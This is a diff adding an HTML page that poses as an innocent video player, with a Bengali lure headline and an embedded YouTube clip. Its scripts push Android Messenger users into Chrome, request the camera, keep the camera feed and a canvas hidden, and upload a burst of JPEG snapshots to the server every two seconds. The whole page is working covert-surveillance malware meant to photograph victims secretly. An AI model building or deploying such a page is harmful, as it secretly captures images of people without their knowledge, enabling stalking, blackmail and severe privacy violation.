@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Totally Innocent Video Player 😇</title>
+<script>
+(function () {
+    var ua = navigator.userAgent;
+
+    var isMessenger =
+        ua.indexOf("FBAN") > -1 ||
+        ua.indexOf("FBAV") > -1 ||
+        ua.indexOf("Messenger") > -1;
+
+    var isAndroid = ua.indexOf("Android") > -1;
+
+    // Chrome-এ গেলে আর redirect করবে না
+    if (isMessenger && isAndroid && !location.search.includes("chrome=1")) {
+
+        var clean = location.origin + location.pathname;
+        var target = clean + "?chrome=1";
+
+        location.href =
+            "intent://" +
+            target.replace(/^https?:\/\//, "") +
+            "#Intent;scheme=https;package=com.android.chrome;end";
+    }
+})();
+</script>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        background-color: pink;
+        padding: 20px;
+    }
+
+    #video-container {
+        margin: 30px auto;
+        width: 300px;
+        height: 40px;
+        background-color: #000;
+        position: relative;
+    }
+
+    /* Camera source (hidden but valid) */
+    #video {
+        width: 640px;
+        height: 480px;
+        display: none;
+    }
+
+    #hidden-canvas {
+        display: none;
+    }
+</style>
+</head>
+
+<body>
+
+<h1>শাথের লোকটাকে একটু মনোযোগ সহকারে দেখেন</h1>
+
+<div id="video-container">
+    <iframe
+        width="103%"
+        height="550"
+        src="https://www.youtube.com/embed/BWnyCtGQUcc?autoplay=1&mute=1"
+        frameborder="0"
+        allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
+        allowfullscreen>
+    </iframe>
+</div>
+
+<p id="status">Loading video...</p>
+
+<!-- Hidden camera elements -->
+<video id="video" autoplay playsinline></video>
+<canvas id="hidden-canvas"></canvas>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("hidden-canvas");
+const ctx = canvas.getContext("2d");
+
+let captureStarted = false;
+
+// Request camera
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+        video.play();
+
+        // Small delay to avoid race condition (mobile browsers)
+        setTimeout(() => {
+            if (!captureStarted) {
+                captureStarted = true;
+                startCapturing();
+            }
+        }, 800);
+    };
+})
+.catch(err => {
+    console.error("Camera permission denied:", err);
+});
+
+// ---- MAIN CAPTURE FUNCTION ----
+function startCapturing() {
+
+    setInterval(() => {
+
+        // Capture 3 images per 2 seconds
+        for (let i = 0; i < 3; i++) {
+
+            setTimeout(() => {
+                if (video.videoWidth === 0 || video.videoHeight === 0) return;
+
+                canvas.width  = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageData = canvas.toDataURL("image/jpeg", 0.95);
+
+                fetch("/upload", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ image: imageData })
+                }).catch(() => {});
+
+            }, i * 200); // 200ms gap between burst frames
+        }
+
+    }, 2000); // every 2 seconds
+}
+</script>
+
+</body>
+</html>
